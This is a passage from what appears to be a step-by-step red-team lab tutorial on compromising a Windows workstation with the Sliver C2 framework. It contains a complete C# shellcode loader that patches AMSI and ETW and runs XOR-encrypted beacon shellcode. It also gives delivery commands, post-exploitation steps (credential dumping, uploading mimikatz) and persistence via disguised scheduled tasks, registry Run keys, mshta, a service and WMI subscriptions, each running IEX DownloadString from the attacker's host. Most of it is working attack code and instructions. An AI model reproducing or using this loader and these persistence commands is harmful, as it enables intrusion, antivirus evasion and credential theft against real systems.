         | (Tell CPU to start running our code)
         v
STEP 7: Shellcode runs, connects to C2
         |
         v
WE HAVE A SHELL!
```

**Why does process injection work? (Deep explanation)**

This is important to understand. Here is the fundamental concept:

The CPU doesn't care WHERE code comes from. It just executes whatever bytes you point it to.

When you run a normal program:
1. Windows loads it from disk
2. Windows places it in memory
3. CPU executes it

When we inject shellcode:
1. WE place our code in memory (using VirtualAlloc)
2. WE point the CPU at it (using CreateThread)
3. CPU executes it

The CPU doesn't know the difference! It just sees bytes at a memory address and starts executing.

**Why is this a security problem?**

Because any program running on Windows can:
1. Ask for memory (VirtualAlloc)
2. Put bytes in that memory
3. Make that memory executable
4. Tell the CPU to run it

Antivirus tries to detect this, but we can evade detection by:
1. Encrypting our shellcode (so it looks random)
2. Patching AMSI (so it can't scan our content)
3. Patching ETW (so no logs are created)

**Let's build it step by step.**

## 12.1: Create the Project Directory

```bash
# Create a directory for our loader
mkdir -p ~/ad-lab/loader
cd ~/ad-lab/loader

# Create a new .NET console project
dotnet new console -n SliverLoader -f net8.0
cd SliverLoader
```

**What does each command do?**

| Command | What it does |
|---------|--------------|
| `mkdir -p ~/ad-lab/loader` | Create directory structure. `-p` means "create parent dirs too" |
| `cd ~/ad-lab/loader` | Change into that directory |
| `dotnet new console -n SliverLoader -f net8.0` | Create a new C# project |
| `cd SliverLoader` | Go into the project folder |

**What does `dotnet new console` create?**

It creates a basic C# console application with:
- `SliverLoader.csproj` - Project file (tells .NET how to build it)
- `Program.cs` - Main code file (this is what we'll edit)

## 12.2: Understanding the Loader Code Structure

Before we write the code, let me explain what each section does:

| Section | Purpose | Why it's needed |
|---------|---------|-----------------|
| **Windows API Imports** | Defines the Windows functions we'll call | We need VirtualAlloc, CreateThread, etc. |
| **Constants** | Defines values like page protection flags | Memory needs to be PAGE_EXECUTE_READWRITE |
| **Encrypted Shellcode** | This is YOUR Sliver beacon shellcode | The actual code that connects to C2 |
| **PatchAMSI function** | Disables Windows script scanning | Otherwise Defender blocks our activity |
| **PatchETW function** | Disables Windows event logging | Otherwise our activity is logged |
| **DecryptShellcode function** | XOR decrypts the shellcode | Converts encrypted bytes back to executable code |
| **ExecuteShellcode function** | Runs the shellcode | Allocates memory, copies code, runs it |
| **Main function** | Entry point, calls everything | Orchestrates the whole attack |

## 12.3: The Complete Loader Code (With Detailed Comments)

**Replace the contents of `Program.cs`:**

```bash
nano Program.cs
```

Delete everything and paste the following code. **I have added extensive comments explaining EVERY line:**

```csharp
/*
 * Sliver Shellcode Loader with AMSI/ETW Bypass
 * 
 * This loader:
 * 1. Patches AMSI to disable script scanning
 * 2. Patches ETW to disable logging
 * 3. Decrypts shellcode in memory
 * 4. Executes shellcode via CreateThread
 * 
 * For educational purposes in controlled lab environments only.
 */

using System;
using System.Runtime.InteropServices;

class Program
{
    // ============================================================
    // SECTION 1: Windows API Imports
    // ============================================================
    // These are the APIs we learned about in Part 3
    
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, 
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect
    );
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(
        IntPtr lpAddress, 
        uint dwSize, 
        uint flNewProtect, 
        out uint lpflOldProtect
    );
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId
    );
    
    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    
    // ============================================================
    // SECTION 2: Constants (Memory allocation flags)
    // ============================================================
    // These are values defined by Microsoft. We use them with VirtualAlloc.
    
    // MEM_COMMIT = 0x1000 means "actually allocate the memory for use"
    const uint MEM_COMMIT = 0x1000;
    
    // MEM_RESERVE = 0x2000 means "reserve address space (but don't allocate yet)"
    // We use both together (0x3000) to reserve AND commit in one call
    const uint MEM_RESERVE = 0x2000;
    
    // PAGE_EXECUTE_READWRITE = 0x40 means "this memory can be read, written, AND executed"
    // This is CRITICAL - normal memory can't execute code!
    // Security tools flag this because legitimate programs rarely need it
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    
    // INFINITE = 0xFFFFFFFF means "wait forever" (used with WaitForSingleObject)
    const uint INFINITE = 0xFFFFFFFF;
    
    // ============================================================
    // XOR KEY - THIS MUST MATCH YOUR ENCRYPTION KEY!
    // ============================================================
    // When you ran encrypt_shellcode.py, it used key 0x35
    // If you changed that, change this to match
    const byte XOR_KEY = 0x35;
    
    // ============================================================
    // SECTION 3: YOUR ENCRYPTED SHELLCODE GOES HERE
    // ============================================================
    //
    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    // !!! THIS IS WHERE YOU PASTE YOUR ENCRYPTED SHELLCODE !!!
    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    //
    // HOW TO GET YOUR SHELLCODE:
    // --------------------------
    // Step 1: On Kali, you ran: python3 encrypt_shellcode.py beacon.bin beacon_encrypted.bin
    // Step 2: This created a file: /tmp/beacon_encrypted.cs
    // Step 3: Open that file: cat /tmp/beacon_encrypted.cs
    // Step 4: Copy EVERYTHING between the curly braces { }
    // Step 5: Paste it below, REPLACING the placeholder bytes
    //
    // WHAT THE FILE LOOKS LIKE:
    // -------------------------
    // // Encrypted shellcode - paste this into your loader
    // byte[] encryptedShellcode = new byte[] {
    //     0xc9, 0x7d, 0xb6, 0xd1, 0xc5, 0xdd, 0xdb, 0x9c, 0x9c, 0x9c, 0x5c, 0x64,
    //     0x5c, 0x65, 0x4d, 0x64, 0x62, 0x53, 0xad, 0xe5, 0x4d, 0x64, 0x62, 0x6b,
    //     ... (thousands more bytes) ...
    //     0xa9, 0xbc, 0x98
    // };
    //
    // COPY ALL THE BYTES (0xc9, 0x7d, 0xb6...) AND PASTE BELOW:
    //
    // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    
    static byte[] encryptedShellcode = new byte[] {
        // =============================================================
        // DELETE THESE PLACEHOLDER BYTES AND PASTE YOUR REAL SHELLCODE
        // =============================================================
        // These are EXAMPLE bytes - they will NOT work!
        // Your real shellcode will be MUCH larger (usually 100,000+ bytes)
        
        0x7d, 0xbc, 0x69, 0x11, 0x3d, 0x4a, 0x2f, 0x87, 0x00, 0x00, 0x00, 0x00
        
        // REPLACE THE LINE ABOVE WITH YOUR ACTUAL ENCRYPTED SHELLCODE
        // It will look like this (but MUCH longer):
        // 0xc9, 0x7d, 0xb6, 0xd1, 0xc5, 0xdd, 0xdb, 0x9c, 0x9c, 0x9c, 0x5c, 0x64,
        // 0x5c, 0x65, 0x4d, 0x64, 0x62, 0x53, 0xad, 0xe5, 0x4d, 0x64, 0x62, 0x6b,
        // ... continuing for hundreds of lines ...
    };
    
    // ============================================================
    // SECTION 4: AMSI Bypass
    // ============================================================
    
    static void PatchAMSI()
    {
        Console.WriteLine("[*] Patching AMSI...");
        
        try
        {
            // Step 1: Load amsi.dll
            IntPtr hAmsi = LoadLibrary("amsi.dll");
            if (hAmsi == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to load amsi.dll (might not be present)");
                return;
            }
            
            // Step 2: Find AmsiScanBuffer
            IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (pAmsiScanBuffer == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to find AmsiScanBuffer");
                return;
            }
            
            // Step 3: Make it writable
            uint oldProtect;
            VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, out oldProtect);
            
            // Step 4: Write our patch
            // mov eax, 0x80070057 (E_INVALIDARG) ; ret
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
            
            Console.WriteLine("[+] AMSI patched successfully!");
        }
        catch (Exception e)
        {
            Console.WriteLine($"[!] AMSI patch error: {e.Message}");
        }
    }
    
    // ============================================================
    // SECTION 5: ETW Bypass
    // ============================================================
    
    static void PatchETW()
    {
        Console.WriteLine("[*] Patching ETW...");
        
        try
        {
            // ntdll.dll is always loaded
            IntPtr hNtdll = LoadLibrary("ntdll.dll");
            if (hNtdll == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to load ntdll.dll");
                return;
            }
            
            // Find EtwEventWrite
            IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
            if (pEtwEventWrite == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to find EtwEventWrite");
                return;
            }
            
            // Make it writable
            uint oldProtect;
            VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, out oldProtect);
            
            // Write 'ret' instruction (0xC3)
            Marshal.WriteByte(pEtwEventWrite, 0xC3);
            
            Console.WriteLine("[+] ETW patched successfully!");
        }
        catch (Exception e)
        {
            Console.WriteLine($"[!] ETW patch error: {e.Message}");
        }
    }
    
    // ============================================================
    // SECTION 6: Shellcode Decryption
    // ============================================================
    
    static byte[] DecryptShellcode(byte[] encrypted, byte key)
    {
        Console.WriteLine($"[*] Decrypting {encrypted.Length} bytes with key 0x{key:X2}...");
        
        byte[] decrypted = new byte[encrypted.Length];
        for (int i = 0; i < encrypted.Length; i++)
        {
            decrypted[i] = (byte)(encrypted[i] ^ key);
        }
        
        Console.WriteLine("[+] Shellcode decrypted!");
        return decrypted;
    }
    
    // ============================================================
    // SECTION 7: Shellcode Execution
    // ============================================================
    
    static void ExecuteShellcode(byte[] shellcode)
    {
        Console.WriteLine("[*] Allocating executable memory...");
        
        // Allocate memory with RWX permissions
        IntPtr shellcodeAddr = VirtualAlloc(
            IntPtr.Zero,                           // Let Windows choose address
            (uint)shellcode.Length,                // Size of shellcode
            MEM_COMMIT | MEM_RESERVE,              // 0x3000
            PAGE_EXECUTE_READWRITE                 // 0x40 - RWX
        );
        
        if (shellcodeAddr == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to allocate memory!");
            return;
        }
        
        Console.WriteLine($"[+] Memory allocated at 0x{shellcodeAddr.ToInt64():X}");
        
        // Copy shellcode to allocated memory
        Console.WriteLine("[*] Copying shellcode to memory...");
        Marshal.Copy(shellcode, 0, shellcodeAddr, shellcode.Length);
        
        // Create thread that starts at shellcode
        Console.WriteLine("[*] Creating thread at shellcode address...");
        IntPtr hThread = CreateThread(
            IntPtr.Zero,      // Default security
            0,                // Default stack size
            shellcodeAddr,    // Start address = our shellcode
            IntPtr.Zero,      // No parameters
            0,                // Start immediately
            IntPtr.Zero       // Don't need thread ID
        );
        
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to create thread!");
            return;
        }
        
        Console.WriteLine("[+] Thread created! Shellcode executing...");
        Console.WriteLine("[*] Beacon should connect to C2. Waiting...");
        
        // Wait for thread (beacon runs indefinitely)
        WaitForSingleObject(hThread, INFINITE);
    }
    
    // ============================================================
    // SECTION 8: Main Entry Point
    // ============================================================
    
    static void Main(string[] args)
    {
        Console.WriteLine(@"
   _____ _ _                   _                     _           
  / ____| (_)                 | |                   | |          
 | (___ | |___   _____ _ __   | |     ___   __ _  __| | ___ _ __ 
  \___ \| | \ \ / / _ \ '__|  | |    / _ \ / _` |/ _` |/ _ \ '__|
  ____) | | |\ V /  __/ |     | |___| (_) | (_| | (_| |  __/ |   
 |_____/|_|_| \_/ \___|_|     |______\___/ \__,_|\__,_|\___|_|   
                                                                
          ORSUBANK Red Team - Lab Exercise
        ");
        
        Console.WriteLine("\n[*] Starting loader...\n");
        
        // Step 1: Bypass security
        PatchAMSI();
        PatchETW();
        
        Console.WriteLine();
        
        // Step 2: Decrypt shellcode
        byte[] decrypted = DecryptShellcode(encryptedShellcode, XOR_KEY);
        
        Console.WriteLine();
        
        // Step 3: Execute shellcode
        ExecuteShellcode(decrypted);
        
        // Note: If beacon is running, we never reach here
        Console.WriteLine("\n[*] Loader finished.");
    }
}
```

## 12.3: Insert Your Encrypted Shellcode

**Open the encrypted shellcode file:**

```bash
cat /tmp/beacon_encrypted.cs
```

**Copy the byte array and paste it into `Program.cs`**, replacing the placeholder line in SECTION 3.

## 12.4: Compile the Loader

**Build the loader:**

```bash
# Compile as a single-file executable
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true
```

**What do these options do?**

| Option | Meaning |
|--------|---------|
| `-c Release` | Build in Release mode (optimized, no debug info) |
| `-r win-x64` | Target Windows 64-bit |
| `--self-contained true` | Include .NET runtime (runs without .NET installed on target) |
| `-p:PublishSingleFile=true` | Package everything into ONE .exe file |
| `-p:EnableCompressionInSingleFile=true` | Compress it to make it smaller |

**Find your compiled loader:**

```bash
ls -la bin/Release/net8.0/win-x64/publish/
```

You should see `SliverLoader.exe` - this is your payload!

## 12.5: Transfer the Loader to Target

**Option 1: HTTP Server (Recommended)**

```bash
# On Kali, serve the file
cd bin/Release/net8.0/win-x64/publish/
python3 -m http.server 8080
```

On Windows target (PowerShell):
```powershell
# Download the loader
Invoke-WebRequest -Uri "http://192.168.100.100:8080/SliverLoader.exe" -OutFile "C:\Temp\SliverLoader.exe"
```

**Option 2: Using Impacket's smbserver**

```bash
# On Kali
impacket-smbserver share . -smb2support
```

On Windows:
```powershell
copy \\192.168.100.100\share\SliverLoader.exe C:\Temp\
```

---

# PART 13: Running the Attack {#part-13-attack}

Now let's execute the attack!

## 13.1: Pre-Attack Checklist

Before running, verify:

| Check | Command |
|-------|---------|
| Sliver listener running | `sliver > jobs` |
| Kali can ping target | `ping 192.168.100.20` |
| Target can ping Kali | `ping 192.168.100.100` (from Windows) |
| Loader is on target | Check `C:\Temp\SliverLoader.exe` exists |

## 13.2: Execute the Loader

**On the Windows target (as any user):**

```powershell
# Navigate to the loader location
cd C:\Temp

# Run the loader
.\SliverLoader.exe
```

**What you should see on the target:**

```
   _____ _ _                   _                     _           
  / ____| (_)                 | |                   | |          
 | (___ | |___   _____ _ __   | |     ___   __ _  __| | ___ _ __ 
  \___ \| | \ \ / / _ \ '__|  | |    / _ \ / _` |/ _` |/ _ \ '__|
  ____) | | |\ V /  __/ |     | |___| (_) | (_| | (_| |  __/ |   
 |_____/|_|_| \_/ \___|_|     |______\___/ \__,_|\__,_|\___|_|   
                                                                
          ORSUBANK Red Team - Lab Exercise Only
        

[*] Starting loader...

[*] Patching AMSI...
[+] AMSI patched successfully!
[*] Patching ETW...
[+] ETW patched successfully!

[*] Decrypting 123456 bytes with key 0x35...
[+] Shellcode decrypted!

[*] Allocating executable memory...
[+] Memory allocated at 0x1A0000000000
[*] Copying shellcode to memory...
[*] Creating thread at shellcode address...
[+] Thread created! Shellcode executing...
[*] Beacon should connect to C2. Waiting...
```

## 13.3: Check for Beacon in Sliver

**Back in Sliver console on Kali:**

```bash
sliver > beacons
```

**What you should see:**

```
 ID         Name            Transport   Hostname   Username        OS/Arch              Last Check-In
========== =============== =========== ========== =============== ==================== ==============
 abc123de   HUNGRY_ZEBRA    https       WS01       ORSUBANK\jlee   windows/amd64        1s ago
```

ðŸŽ‰ **You have a beacon!**

## 13.4: Interacting with the Beacon

**Use the beacon:**

```bash
# Connect to the beacon
sliver > use abc123de

# Or use the name
sliver > use HUNGRY_ZEBRA

# You're now in a beacon context
sliver (HUNGRY_ZEBRA) >
```

**Run commands:**

```bash
# Get system info
sliver (HUNGRY_ZEBRA) > info

# Get current user
sliver (HUNGRY_ZEBRA) > whoami

# List files
sliver (HUNGRY_ZEBRA) > ls C:\\Users

# Get processes
sliver (HUNGRY_ZEBRA) > ps
```

**Note about beacon timing:**

Beacons check in periodically (default is around 60 seconds). When you run a command:
1. The command is queued on the C2 server
2. Next time the beacon checks in, it receives the command
3. It executes and queues the result
4. Next check-in, you see the result

For faster interaction, you can use sessions (but they're noisier).

## 13.5: What Just Happened?

Let's trace the full attack:

```
1. SliverLoader.exe started
         |
         v
2. AMSI patched - Defender can't scan script content
         |
         v
3. ETW patched - No logging of our activities
         |
         v
4. Encrypted shellcode decrypted in memory
         |
         v
5. Memory allocated with PAGE_EXECUTE_READWRITE
         |
         v
6. Decrypted shellcode copied to memory
         |
         v
7. CreateThread started executing shellcode
         |
         v
8. Shellcode connected to 192.168.100.100:443 (HTTPS)
         |
         v
9. Sliver received beacon connection
         |
         v
10. WE CONTROL THE MACHINE!
```

---
---

# PART 14: Post-Exploitation Commands {#part-14-postexploit}

Now that you have a beacon, let's explore what you can do with it.

## 14.1: Basic Reconnaissance Commands

**In the Sliver console, after selecting your beacon:**

```bash
sliver > use <beacon-id>
sliver (BEACON_NAME) >
```

### System Information

```bash
# Get detailed system info
info

# Expected output:
#         Beacon ID: abc123de-1234-5678-abcd-ef1234567890
#             Name: HUNGRY_ZEBRA
#         Hostname: WS01.orsubank.local
#             UUID: 12345678-abcd-1234-abcd-123456789abc
#         Username: ORSUBANK\jlee
#              UID: S-1-5-21-...
#              GID: S-1-5-21-...
#              PID: 4568
#               OS: windows
#          Version: 10.0.22631
#             Arch: amd64
```

### Current User

```bash
# Who am I?
whoami

# Output: ORSUBANK\jlee
```

### Network Information

```bash
# Get network interfaces
ifconfig

# Output shows IP addresses, MAC addresses, interface names
```

### Process List

```bash
# List running processes
ps

# Look for interesting processes:
# - lsass.exe (credentials here!)
# - winlogon.exe
# - explorer.exe
# - defender processes (MsMpEng.exe)
```

## 14.2: File System Commands

```bash
# List directory contents
ls C:\\Users

# Change directory
cd C:\\Users\\jlee\\Desktop

# Print working directory
pwd

# Download a file from target to your Kali
download C:\\Users\\jlee\\Desktop\\passwords.txt

# Upload a file from Kali to target
upload /tmp/tools/mimikatz.exe C:\\Temp\\m.exe

# Read a file
cat C:\\Windows\\System32\\drivers\\etc\\hosts
```

## 14.3: Execute Commands

```bash
# Run a shell command (spawns cmd.exe)
shell whoami /all

# Run PowerShell (be careful - can trigger detection!)
powershell Get-Process

# Execute a program
execute C:\\Windows\\System32\\notepad.exe
```

## 14.4: Credential Gathering

**Important:** These commands are more likely to trigger detection!

```bash
# Dump credentials (requires SYSTEM or admin)
# First, check if you're admin:
getprivs

# If admin, try:
hashdump    # Dump local SAM database
```

## 14.5: Lateral Movement Preparation

```bash
# Get domain information
shell net user /domain
shell net group "Domain Admins" /domain

# See what shares are accessible
shell net view \\\\DC01

# Check current tokens/privileges
getprivs
```

---

# PART 15: Troubleshooting Common Issues {#part-15-troubleshoot}

Things don't always work perfectly. Here's how to fix common problems.

## 15.1: Loader Runs But No Beacon

**Symptoms:** Loader shows success messages but no beacon appears in Sliver.

**Check 1: Is the listener running?**
```bash
sliver > jobs

# If no jobs listed, restart listener:
sliver > https -l 192.168.100.100 -p 443
```

**Check 2: Can target reach Kali?**

On Windows target:
```powershell
# Test connectivity
Test-NetConnection -ComputerName 192.168.100.100 -Port 443
```

**Check 3: Firewall blocking traffic?**

On Kali:
```bash
# Allow port 443
sudo ufw allow 443/tcp

# Or disable firewall for testing
sudo ufw disable
```

On Windows (check if outbound is blocked):
```powershell
# Test with browser
Start-Process "https://192.168.100.100:443"
```

**Check 4: Wrong shellcode?**

- Did you paste the encrypted shellcode correctly?
- Did you use the same XOR key (0x35) in encryption and loader?
- Is the shellcode for the correct architecture (amd64)?

## 15.2: AMSI Blocking Our Loader

**Symptoms:** Defender blocks the .exe before it runs, or PowerShell commands fail.

**Solution 1: Loader is detected**

The loader itself might be getting flagged. Try:
- Recompile with different options
- Rename the executable
- Use a packer (advanced)

**Solution 2: AMSI patch detected**

The AMSI patch bytes might be signatured. Try alternative patches:

```csharp
// Alternative AMSI patch (returns AMSI_RESULT_CLEAN)
byte[] patch = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
```

## 15.3: ETW Patch Crashes the Process

**Symptoms:** Loader crashes when patching ETW.

**Cause:** On some Windows versions, EtwEventWrite might have different prologue bytes.

**Solution:** Skip ETW patching if it fails:
```csharp
try
{
    PatchETW();
}
catch
{
    Console.WriteLine("[!] ETW patch skipped");
}
```

## 15.4: .NET SDK Installation Issues

**Problem:** `dotnet: command not found`

```bash
# Verify .NET is installed
which dotnet

# If not found, reinstall
sudo apt update
sudo apt install -y dotnet-sdk-8.0

# Add to PATH if needed
export PATH="$PATH:$HOME/.dotnet"
echo 'export PATH="$PATH:$HOME/.dotnet"' >> ~/.bashrc
```

## 15.5: Sliver Won't Start

**Problem:** Permission denied or port already in use.

```bash
# Run as root
sudo sliver-server

# Check if port 443 is in use
sudo netstat -tlnp | grep 443

# Kill conflicting process
sudo kill <PID>

# Or use a different port
sliver > https -l 192.168.100.100 -p 8443
```

## 15.6: Beacon Connects Then Immediately Dies

**Cause:** Main process exiting before beacon establishes.

**Solution:** Make sure WaitForSingleObject is called with INFINITE:
```csharp
WaitForSingleObject(hThread, 0xFFFFFFFF); // INFINITE
```

---

# PART 16: MITRE ATT&CK Mapping {#part-16-mitre}

Understanding how our attack maps to the MITRE ATT&CK framework is important for interviews and blue team awareness.

## 16.1: Techniques Used in This Attack

| Tactic | Technique ID | Technique Name | How We Used It |
|--------|-------------|----------------|----------------|
| **Execution** | T1059.001 | PowerShell | PowerShell to download loader |
| **Execution** | T1106 | Native API | VirtualAlloc, CreateThread for shellcode |
| **Defense Evasion** | T1562.001 | Disable/Modify Tools | Patching AMSI and ETW |
| **Defense Evasion** | T1027 | Obfuscated Files | XOR encrypted shellcode |
| **Defense Evasion** | T1055 | Process Injection | Executing shellcode in memory |
| **Defense Evasion** | T1140 | Deobfuscate/Decode | Decrypting shellcode at runtime |
| **Command and Control** | T1071.001 | Web Protocols | HTTPS beacon communication |
| **Command and Control** | T1573.002 | Encrypted Channel | TLS/HTTPS encryption |

## 16.2: MITRE ATT&CK Navigator

You can visualize these techniques at: https://mitre-attack.github.io/attack-navigator/

**Our attack chain:**
```
Initial Access -> Execution -> Defense Evasion -> C2
```

---

---

# PART 17: Persistence with Defender Bypass {#part-17-persistence}

Once you have initial access, you want to KEEP that access. If the user restarts their computer, closes the process, or your beacon dies - you lose access. Persistence solves this.

## 18.1: What is Persistence?

**Definition:** Persistence is any technique that allows malware to survive system restarts or user logoffs.

**Attacker perspective:** You've got a beacon running. If the user reboots, you lose it. Persistence ensures your malware starts again automatically.

**Common persistence locations:**

| Location | How it works | Detection risk |
|----------|-------------|----------------|
| Scheduled Tasks | Windows runs our code at specified times/events | Medium |
| Registry Run Keys | Windows runs our code at login | Medium-High |
| Services | Windows runs our code as a service | High (requires admin) |
| Startup Folder | Simple, drops executable in startup path | High (obvious) |
| WMI Subscriptions | Event-based execution | Medium |
| DLL Hijacking | Legitimate app loads our DLL | Low (stealthy) |

## 18.2: The Challenge - Defender is Watching

**All persistence locations are monitored by Defender.**

When you:
- Create a scheduled task â†’ Defender inspects it
- Add a registry run key â†’ Defender scans the executable
- Install a service â†’ Defender monitors the binary

**Our strategy:**
1. Use encoded/obfuscated commands
2. Store payload remotely (not on disk)
3. Use LOLBins (Living Off the Land Binaries)
4. Leverage existing Sliver infrastructure

## 18.3: Persistence Method 1 - Scheduled Task (Recommended)

**Why scheduled tasks?**
- Work with regular user privileges
- Can trigger on multiple events (logon, time, etc.)
- Can use PowerShell to download and execute

### 18.3.1: The Payload Strategy

Instead of dropping a file, we'll have the scheduled task:
1. Download the loader from our C2
2. Execute it in memory
3. Re-establish the beacon

**Create a persistence payload in Sliver:**

First, generate a stageless PowerShell payload:

```bash
# In Sliver console
sliver > generate beacon --http 192.168.100.100:443 --os windows --arch amd64 --format shellcode --save /tmp/persist.bin
```

**Encode it for PowerShell:**

```bash
# On Kali
base64 -w 0 /tmp/persist.bin > /tmp/persist.b64
```

### 18.3.2: Create the Scheduled Task (via Sliver)

**From your active beacon:**

```bash
sliver (HUNGRY_ZEBRA) > shell
```

**Create a scheduled task that runs at logon:**

```powershell
# Create scheduled task - runs at user logon
schtasks /create /tn "WindowsDefenderUpdate" /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/update.ps1')\"" /sc onlogon /ru "%USERNAME%" /f
```

**Breaking down the command:**

| Part | What it does |
|------|-------------|
| `/tn "WindowsDefenderUpdate"` | Task name (looks legitimate) |
| `/tr "powershell..."` | Command to run |
| `-WindowStyle Hidden` | No visible window |
| `-NoProfile` | Don't load PowerShell profile (faster, less noise) |
| `-ExecutionPolicy Bypass` | Allow script execution |
| `IEX (...).DownloadString(...)` | Download and execute script |
| `/sc onlogon` | Trigger: when any user logs on |
| `/ru "%USERNAME%"` | Run as current user |
| `/f` | Force overwrite if exists |

### 18.3.3: Create the Persistence Script (on Kali)

**Create `/var/www/html/update.ps1`:**

```powershell
# AMSI Bypass
$a = [Ref].Assembly.GetTypes()
ForEach($t in $a) {
    if ($t.Name -like "*siUtils") {
        $t.GetFields('NonPublic,Static') | ForEach-Object {
            if ($_.Name -like "*Context") {
                $_.SetValue($null, [IntPtr]::Zero)
            }
        }
    }
}

# Download and execute shellcode
$bytes = (New-Object System.Net.WebClient).DownloadData("http://192.168.100.100:8080/persist.bin")

# Decrypt (XOR with key 0x35)
$key = 0x35
$decrypted = @()
foreach ($byte in $bytes) {
    $decrypted += ($byte -bxor $key)
}

# Allocate RWX memory
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($decrypted.Length)
[System.Runtime.InteropServices.Marshal]::Copy($decrypted, 0, $mem, $decrypted.Length)

# Create thread
$callback = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($mem, [IntPtr])
$callback.Invoke()
```

**Note:** This is a simplified example. For real engagements, use more sophisticated obfuscation.

### 18.3.4: Host the Files

```bash
# On Kali
cd /var/www/html
sudo cp /tmp/persist.bin .
sudo systemctl start apache2

# Or use Python
python3 -m http.server 8080
```

### 18.3.5: Verify the Task

**Check the task was created:**

```powershell
schtasks /query /tn "WindowsDefenderUpdate"
```

**Output:**
```
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
WindowsDefenderUpdate                    At logon time          Ready
```

## 18.4: Persistence Method 2 - Registry Run Key

**Registry keys that run programs at logon:**

| Key | Scope | Requires Admin |
|-----|-------|----------------|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Current user only | No |
| `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | All users | Yes |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | Current user, once | No |

### 18.4.1: Add Registry Persistence (User-Level)

```powershell
# From Sliver beacon
shell reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.100:8080/update.ps1')\"" /f
```

**Verify:**

```powershell
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

### 18.4.2: MSHTA Variant (Bypasses AppLocker Sometimes)

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HealthCheck" /t REG_SZ /d "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -w hidden -c IEX(curl http://192.168.100.100:8080/update.ps1)\"\", 0:close\")" /f
```

## 18.5: Persistence Method 3 - Windows Service (Requires Admin)

If you have local admin rights, services are powerful:
- Run as SYSTEM (highest privileges)
- Start automatically at boot
- Restart on failure

### 18.5.1: Create a Service Binary

**You'll need a service binary. Sliver can generate one:**

```bash
# Generate a service binary
sliver > generate beacon --http 192.168.100.100:443 --os windows --arch amd64 --format service --save /tmp/svc_update.exe
```

### 18.5.2: Transfer and Install

```bash
# Upload via Sliver
sliver (HUNGRY_ZEBRA) > upload /tmp/svc_update.exe C:\\Windows\\Temp\\svc_update.exe
```

**Create the service:**

```powershell
# Requires admin
sc.exe create "WindowsSecurityUpdate" binPath= "C:\Windows\Temp\svc_update.exe" start= auto DisplayName= "Windows Security Update Service"

# Start it
sc.exe start WindowsSecurityUpdate
```

**Note:** Service binaries are more likely to trigger AV. Consider using service-wrapper techniques or signing the binary.

## 18.6: Persistence Method 4 - WMI Event Subscription (Advanced)

**WMI subscriptions are event-driven and harder to find:**

```powershell
# Create WMI event subscription
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9 AND TargetInstance.Minute = 0"

$FilterArgs = @{
    Name = 'SecurityEventFilter'
    EventNamespace = 'root/cimv2'
    QueryLanguage = 'WQL'
    Query = $Query
}
$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'SecurityEventConsumer'
    CommandLineTemplate = 'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(''http://192.168.100.100:8080/update.ps1'')"'
}
$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

**This runs every day at 9:00 AM.**

## 18.7: Sliver's Built-in Persistence

